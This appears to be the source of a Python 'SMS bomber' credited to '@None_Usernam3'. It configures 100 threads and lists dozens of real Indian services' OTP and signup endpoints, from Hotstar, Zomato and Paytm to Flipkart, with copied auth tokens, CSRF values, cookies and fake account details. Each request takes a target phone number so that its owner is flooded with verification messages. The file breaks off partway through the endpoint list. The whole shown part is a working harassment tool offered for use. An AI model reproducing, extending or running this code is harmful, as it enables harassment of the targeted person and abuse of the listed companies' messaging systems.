import os
import sys
import json
import random
import time
import threading
import requests
from requests.adapters import HTTPAdapter

# ─── colors ───────────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
C = "\033[96m"; W = "\033[97m"; D = "\033[2m"; X = "\033[0m"

BANNER = f"""{R}
  ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{X}{Y}     SMS Bomber By @None_Usernam3 — real endpoints, cooldown, session pool{X}
"""

# ─── config ───────────────────────────────────────────
THREAD_COUNT  = 100
STATS_REFRESH = 0.5
TIMEOUT       = 10

# ─── counters ─────────────────────────────────────────
sent         = 0
failed       = 0
rate_limited = 0
lock         = threading.Lock()
running      = True

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 Chrome/85.0.4183.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 Chrome/85.0.4183.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320F Build/LMY47V) AppleWebKit/537.36 Chrome/55.0.2883.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
    "Dalvik/2.1.0 (Linux; U; Android 12; M2102J20SG Build/SKQ1.211006.001)",
]

# ─── verified endpoints (real headers/tokens from XBomber services.json + wlzbi) ──
ENDPOINTS = [
    {
        "name": "Hotstar_1",
        "method": "PUT",
        "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        "headers": {
            "Host": "api.hotstar.com",
            "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
            "content-type": "application/json",
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
            "x-hs-appversion": "5.0.40",
            "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "origin": "https://www.hotstar.com",
            "referer": "https://www.hotstar.com/in/subscribe/sign-in",
        },
        "json": {"phone_number": "{phone}", "country_prefix": "91"},
        "fmt": "raw",
    },
    {
        "name": "Hotstar_2",
        "method": "PUT",
        "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
        "headers": {
            "Host": "api.hotstar.com",
            "x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDQ0MzQ5NDUsImlhdCI6MTYwMzgzMDE0NSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiNDcuOS4xMjIuNDVcIixcImNvdW50cnlDb2RlXCI6XCJpblwiLFwiY3VzdG9tZXJUeXBlXCI6XCJudVwiLFwidHlwZVwiOlwiZ3Vlc3RcIixcImlzRW1haWxWZXJpZmllZFwiOmZhbHNlLFwiaXNQaG9uZVZlcmlmaWVkXCI6ZmFsc2UsXCJkZXZpY2VJZFwiOlwiZmFhODhmMDUtNzQzMi00MTAzLTk4ODYtN2JkOTM0ZjVjM2ExXCIsXCJwcm9maWxlXCI6XCJBRFVMVFwiLFwidmVyc2lvblwiOlwidjJcIixcInN1YnNjcmlwdGlvbnNcIjp7XCJpblwiOnt9fSxcImlzc3VlZEF0XCI6MTYwMzgzMDE0NTg4NH0iLCJ2ZXJzaW9uIjoiMV8wIn0.ATU4GrG4KucvkynhrFdg28qJ9LRwsN5MoWHlirRQsqo",
            "content-type": "application/json",
            "x-hs-platform": "PCTV",
            "x-country-code": "IN",
            "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1",
            "hotstarauth": "st=1603830144~exp=1603836144~acl=/um/v3/*~hmac=cc2a715c0f26045e44e271d198ae382468d8a7dcb08825623016d6dcea06072d",
            "x-hs-appversion": "6.93.0",
            "origin": "https://www.hotstar.com",
        },
        "json": {"phone_number": "{phone}", "country_prefix": "91"},
        "fmt": "raw",
    },
    {
        "name": "AltBalaji_1",
        "method": "POST",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "headers": {
            "Host": "api.cloud.altbalaji.com",
            "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
            "Content-Type": "application/json",
            "Origin": "https://www.altbalaji.com",
            "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D",
        },
        "json": {"phone_number": "{phone}", "country_code": "91", "platform": "web", "exp": 1601043289127},
        "fmt": "raw",
    },
    {
        "name": "AltBalaji_2",
        "method": "POST",
        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
        "headers": {
            "Host": "api.cloud.altbalaji.com",
            "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMzkxNTgyNjcxMH0.xpvhIZb9W-sLsITPKBusMKguK_2WzIioXJSwAjtzCnU",
            "Content-Type": "application/json",
            "Origin": "https://www.altbalaji.com",
        },
        "json": {"phone_number": "{phone}", "country_code": "91", "platform": "web", "exp": 1603915826710},
        "fmt": "raw",
    },
    {
        "name": "Voot_1",
        "method": "POST",
        "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        "headers": {
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.voot.com",
            "referer": "https://www.voot.com/",
        },
        "json": {"type": "mobile", "mobile": "{phone}", "countryCode": "+91"},
        "fmt": "plus91",
    },
    {
        "name": "Voot_2",
        "method": "POST",
        "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
        "headers": {
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://www.voot.com",
            "referer": "https://www.voot.com/",
        },
        "json": {"type": "mobile", "mobile": "{phone}", "countryCode": "+91"},
        "fmt": "plus91",
    },
    {
        "name": "SonyLIV_1",
        "method": "POST",
        "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        "headers": {
            "Host": "apiv2.sonyliv.com",
            "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
            "content-type": "application/json",
            "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256",
            "x-via-device": "true",
            "app_version": "3.1.20",
            "origin": "https://www.sonyliv.com",
        },
        "json": {"channelPartnerID": "MSMIND", "mobileNumber": "{phone}", "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z"},
        "fmt": "raw",
    },
    {
        "name": "SonyLIV_2",
        "method": "POST",
        "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
        "headers": {
            "Host": "apiv2.sonyliv.com",
            "device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
            "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDM4Mjc0NTEsImV4cCI6MTYwNTEyMzQ1MSwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.Pxfpv3puWt_4sbltsDa2UsmgeeSp30KK2lePV15-_AQ1dQ4Q6Iq6W2fKEpXUaz4WnXEMxIHTu4u7RRYjkp4SgKzuRFD4rMYyWxPBqdz2Xdsqp3eCYjza_re4bbJigWoF0X-X9Tue5D1wBjxr_XWlk9apED8gmzewR3SQnHgnFSf-TRqvb8v9nLofBcCLTLKs11yHDmZv8WN9Hi4G_xXxoRN1IqjqW4kHbXvw8hHxzyQZPAgmP18FZkJk62vHTUOcIa1cAFXrRl9yInqUj3UDaPVIJ4tu7XQGuTjn21iqusgWkXKtKnoeHftWrxbd645JeeBQik1b8qESSYCI1xMzD01eEcmaxaSP5abuCEMBGHmGIVwpyskiSwkBT-cuZe216i07XxZuaeo29mXrkuizNXfhAgZ1GvLD22rYOHt-PaGA-bKy_wHZv6ILf6Wt9XwuuxzroRKd_IS2Nl3pNMRzTl1UJ02uCTWw8RIdLFykiH3lBXSv4OkHMVUVJJp6KSSQHuH8Ejw3Zjag_rL2XkZvU7T9dT1ddforRk92_nuE96NTaj_UM-gb920oYoGBIxD-CoR5EvqbWlN4WzFF-AaV4auYobW9y1c0i-LiZrPE7dkDyuWSBsk1R-fBpTQDV2OhmbvWYiquurrKFhY5HFZy6bZ-Xrw_58mkn7-Ek0LaAEQ",
            "content-type": "application/json",
            "session_id": "1b3e01a7268d4aff933446f020e2f3ab-1603827494316",
            "x-via-device": "true",
            "app_version": "3.1.42.3",
            "origin": "https://www.sonyliv.com",
        },
        "json": {"mobileNumber": "{phone}", "channelPartnerID": "MSMIND", "country": "IN", "timestamp": "2020-10-27T19:39:13.355Z"},
        "fmt": "raw",
    },
    {
        "name": "Zee5",
        "method": "GET",
        "url": "https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno={phone}",
        "headers": {
            "Host": "b2bapi.zee5.com",
            "Origin": "https://www.zee5.com",
            "Referer": "https://www.zee5.com/",
        },
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "Apollo247",
        "method": "POST",
        "url": "https://webapi.apollo247.com/",
        "headers": {
            "Host": "webapi.apollo247.com",
            "Authorization": "Bearer 3d1833da7020e0602165529446587434",
            "content-type": "application/json",
            "Origin": "https://www.apollo247.com",
        },
        "json": {
            "operationName": "Login",
            "variables": {"mobileNumber": "+91{phone}", "loginType": "PATIENT"},
            "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"
        },
        "fmt": "plus91",
    },
    {
        "name": "Netmeds",
        "method": "GET",
        "url": "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        "headers": {
            "Host": "m.netmeds.com",
            "referer": "https://m.netmeds.com/customer/account/login",
            "cookie": "G_ENABLED_IDPS=google; liteprompt=disabled",
        },
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "GetInstaCash",
        "method": "POST",
        "url": "https://getinstacash.in/sell/getData.php",
        "headers": {
            "Host": "getinstacash.in",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login",
        },
        "data": "type=sendOTP&mobile={phone}",
        "fmt": "raw",
    },
    {
        "name": "FBBOnline",
        "method": "POST",
        "url": "https://www.fbbonline.in/customer/account/GenerateOtp",
        "headers": {
            "Host": "www.fbbonline.in",
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.fbbonline.in",
        },
        "data": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={phone}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=",
        "fmt": "raw",
    },
    {
        "name": "Grofers",
        "method": "POST",
        "url": "https://grofers.com/v2/accounts/",
        "headers": {
            "Host": "grofers.com",
            "device_id": "a11f656b-422e-4617-953b-c350d517467d",
            "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13",
            "app_client": "consumer_web",
            "content-type": "application/x-www-form-urlencoded",
        },
        "data": "user_phone={phone}",
        "fmt": "raw",
    },
    {
        "name": "Snapdeal",
        "method": "POST",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "headers": {
            "Host": "m.snapdeal.com",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://m.snapdeal.com",
        },
        "data": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy",
        "fmt": "raw",
    },
    {
        "name": "Zomato_1",
        "method": "POST",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "headers": {
            "Host": "www.zomato.com",
            "x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d",
            "content-type": "application/json",
            "origin": "https://www.zomato.com",
            "cookie": "csrf=a6b0c09972b2bdd30c9c1b6552caee5d; PHPSESSID=8071a1fa7b6f728acb522e9f022e13ae",
        },
        "json": {"country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone"},
        "fmt": "raw",
    },
    {
        "name": "Zomato_2",
        "method": "POST",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "headers": {
            "Host": "www.zomato.com",
            "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
            "content-type": "application/json",
            "origin": "https://www.zomato.com",
            "cookie": "csrf=74a094f89ea708a8f3b78c9a6df38349; PHPSESSID=de653951716ab490d5639700c776d524",
        },
        "json": {"country_id": 1, "phone": "{phone}", "verification_type": "sms", "method": "phone"},
        "fmt": "raw",
    },
    {
        "name": "Cuemath_1",
        "method": "POST",
        "url": "https://www.cuemath.com/api/v4/parents/",
        "headers": {"Host": "www.cuemath.com", "Content-Type": "application/JSON", "Origin": "https://www.cuemath.com"},
        "json": {"intl_mobile": {"phone": ""}, "phone": "{phone}", "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id"},
        "fmt": "raw",
    },
    {
        "name": "Dream11_1",
        "method": "POST",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "headers": {
            "Host": "www.dream11.com",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
            "cookie": "__csrf=fb1f1947-4547-392d-9a28-a9de30d9e766",
        },
        "json": {
            "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            "variables": {"email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia"}
        },
        "fmt": "raw",
    },
    {
        "name": "Dream11_2",
        "method": "POST",
        "url": "https://www.dream11.com/graphql/mutation/pwa/register",
        "headers": {
            "Host": "www.dream11.com",
            "device": "pwa",
            "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
            "content-type": "application/json",
            "origin": "https://www.dream11.com",
        },
        "json": {
            "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
            "variables": {"email": "tsunami@gmail.com", "mobileNumber": "{phone}", "password": "tsunami@123astronomia"}
        },
        "fmt": "raw",
    },
    {
        "name": "Doubtnut",
        "method": "POST",
        "url": "https://doubtnut.com/api/v1/user/login",
        "headers": {"Host": "doubtnut.com", "content-type": "application/x-www-form-urlencoded", "origin": "https://doubtnut.com"},
        "data": "phone={phone}",
        "fmt": "raw",
    },
    {
        "name": "Vedantu",
        "method": "POST",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "headers": {"Host": "user.vedantu.com", "content-type": "application/json", "origin": "https://www.vedantu.com"},
        "json": {"email": None, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345"},
        "fmt": "raw",
    },
    {
        "name": "Unacademy",
        "method": "POST",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "headers": {"Host": "unacademy.com", "authorization": "Bearer undefined", "content-type": "application/json", "origin": "https://unacademy.com"},
        "json": {"phone": "{phone}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": True, "is_un_teach_user": False},
        "fmt": "raw",
    },
    {
        "name": "Byjus",
        "method": "POST",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "headers": {"Host": "bcas-prod.byjusweb.com", "content-type": "application/x-www-form-urlencoded", "origin": "https://byjus.com"},
        "data": "phoneNumber={phone}&page=free-trial-classes",
        "fmt": "raw",
    },
    {
        "name": "RedBus_1",
        "method": "GET",
        "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        "headers": {"Host": "m.redbus.in", "referer": "https://m.redbus.in/preregister"},
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "RedBus_2",
        "method": "GET",
        "url": "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        "headers": {"Host": "m.redbus.in", "referer": "https://m.redbus.in/preregister"},
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "Careers360",
        "method": "POST",
        "url": "https://www.careers360.com/ajax/no-cache/user/otp-send",
        "headers": {
            "Host": "www.careers360.com",
            "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://www.careers360.com",
        },
        "data": "mobile_number={phone}&method=call&uid=12692588",
        "fmt": "raw",
    },
    {
        "name": "Coolwinks",
        "method": "GET",
        "url": "https://api.coolwinks.com/api/accounts/is_already_registered/?username={phone}",
        "headers": {"Host": "api.coolwinks.com", "Origin": "https://www.coolwinks.com"},
        "json": None,
        "fmt": "raw",
    },
    {
        "name": "Gaana",
        "method": "POST",
        "url": "https://jsso1.indiatimes.com/sso/crossapp/identity/native/registerOnlyMobile",
        "headers": {
            "appVersion": "8.9.0",
            "channel": "gaana.com",
            "tgid": "j9qcq0z2ur4llq2a58qqmag2",
            "sdkVersion": "1.0",
            "deviceId": "j9qcq0z2ur4llq2a58qqmag2",
            "platform": "android",
            "Content-Type": "application/json; charset=utf-8",
            "Host": "jsso1.indiatimes.com",
        },
        "json": {"mobile": "91-{phone}"},
        "fmt": "raw",
    },
    {
        "name": "Flipkart",
        "method": "POST",
        "url": "https://1.rome.api.flipkart.com/1/action/view",
        "headers": {
            "Host": "1.rome.api.flipkart.com",
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "content-type": "application/json",
            "Origin": "https://www.flipkart.com",
        },
        "json": {"actionRequestContext": {"type": "LOGIN_IDENTITY_VERIFY", "loginIdPrefix": "+91", "loginId": "{phone}", "loginType": "MOBILE", "verificationType": "OTP", "screenName": "LOGIN_V4_MOBILE", "sourceContext": "DEFAULT"}},
        "fmt": "raw",
    },
    {
        "name": "Ullu",
        "method": "POST",
        "url": "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        "headers": {"Host": "ullu.app", "origin": "https://ullu.app"},
        "json": {},
        "fmt": "raw",
    },
    {
        "name": "Paytm",
        "method": "POST",
        "url": "https://accounts.paytm.com/v2/api/register",
        "headers": {"Host": "accounts.paytm.com", "Content-Type": "application/json", "Origin": "https://accounts.paytm.com"},
        "json": {"email": "", "mobile": "{phone}", "loginPassword": "Pura@1090", "csrfToken": "f7ea628c-91a2-5f14-82ca-6f7eee295b1d", "redirectUri": "https://paytm.com/v1/api/authresponse", "clientId": "paytm-web-secure", "scope": "paytm", "state": "", "responseType": "code", "theme": "mp-html5", "dob_agreement": True},
        "fmt": "raw",
    },
    {
        "name": "Ogonn",
        "method": "POST",
        "url": "https://ogonn.in/otp",
        "headers": {"Host": "ogonn.in", "x-requested-with": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://ogonn.in"},
        "data": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}",
        "fmt": "raw",
    },
    {
        "name": "AakashDigital_1",
        "method": "POST",
        "url": "https://digital.aakash.ac.in/signup-otp-verify",
        "headers": {"Host": "digital.aakash.ac.in", "x-requested-with": "XMLHttpRequest", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://digital.aakash.ac.in"},
        "data": "&mobileval={phone}",
        "fmt": "raw",
    },
    {
        "name": "Swiggy",
        "method": "POST",
        "url": "https://www.swiggy.com/mapi/auth/signup",
        "headers": {"Host": "www.swiggy.com", "__fetch_req__": "true", "content-type": "application/json", "origin": "https://www.swiggy.com"},
        "json": {"name": "dbdbdbd", "email": "tsunami@gmail.com", "password": "sndndndbdj283jsbsbs", "referral_code": "", "mobile": "{phone}", "_csrf": "jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"},
        "fmt": "raw",
    },
    {
        "name": "Limeroad",
        "method": "POST",
        "url": "https://www.limeroad.com/auth/get_uuid_v2?ajax=true&ret=https://www.limeroad.com/myaccount/orders?ajax=true&mobileOnly=false&doAction=",
        "headers": {"Host": "www.limeroad.com", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.limeroad.com"},
        "data": "utf8=%E2%9C%93&authenticity_token=6686Dtpby7plpvjXr5%2Fe8oyPdiQ3Weta9Y9ydzSRP64%3D&user_id={phone}",
        "fmt": "raw",
    },
    {
        "name": "Cilory",
        "method": "POST",
        "url": "https://www.cilory.com/app/w/auth/soft",
        "headers": {"Host": "www.cilory.com", "content-type": "application/json;charset=UTF-8", "origin": "https://www.cilory.com"},
        "json": {"mobile": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "Ajio_1",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "headers": {"Host": "login.web.ajio.com", "content-type": "application/json", "Origin": "https://www.ajio.com"},
        "json": {"firstName": "Tsunami Bomber", "login": "tsunami@gmail.com", "password": "kd34646@3131nxnxn", "genderType": "", "mobileNumber": "{phone}", "requestType": "SENDOTP"},
        "fmt": "raw",
    },
    {
        "name": "Ajio_2",
        "method": "POST",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "headers": {"Host": "login.web.ajio.com", "content-type": "application/json", "Origin": "https://www.ajio.com"},
        "json": {"firstName": "Djdhdjsjsjsjsk", "login": "xjdjdosh@gmail.com", "password": "spider##1213", "genderType": "Female", "mobileNumber": "{phone}", "requestType": "SENDOTP"},
        "fmt": "raw",
    },
    {
        "name": "BookMyShow_1",
        "method": "POST",
        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "headers": {"Host": "in.bookmyshow.com", "content-type": "application/json", "origin": "https://in.bookmyshow.com"},
        "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{phone}", "origin": "https://in.bookmyshow.com"}},
        "fmt": "raw",
    },
    {
        "name": "BookMyShow_2",
        "method": "POST",
        "url": "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
        "headers": {"Host": "in.bookmyshow.com", "content-type": "application/json", "origin": "https://in.bookmyshow.com"},
        "json": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{phone}", "origin": "https://in.bookmyshow.com"}},
        "fmt": "raw",
    },
    {
        "name": "BigBasket",
        "method": "POST",
        "url": "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
        "headers": {
            "Host": "www.bigbasket.com",
            "x-csrftoken": "gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
            "x-channel": "BB-PWA",
            "content-type": "application/json",
            "origin": "https://www.bigbasket.com",
        },
        "json": {"identifier": "{phone}"},
        "fmt": "raw",
    },
    {
        "name": "FloMattress",
        "method": "POST",
        "url": "https://cod.flomattress.com/api/otp",
        "headers": {"Host": "cod.flomattress.com", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.flomattress.com"},
        "data": "number={phone}&store=hushbedding.myshopify.com",
        "fmt": "raw",
    },
    {
        "name": "Banggood",
        "method": "POST",
        "url": "https://m.banggood.in/index.php?com=login&t=sendMtSms&c=api",
        "headers": {"Host": "m.banggood.in", "content-type": "application/x-www-form-urlencoded", "origin": "https://m.banggood.in"},
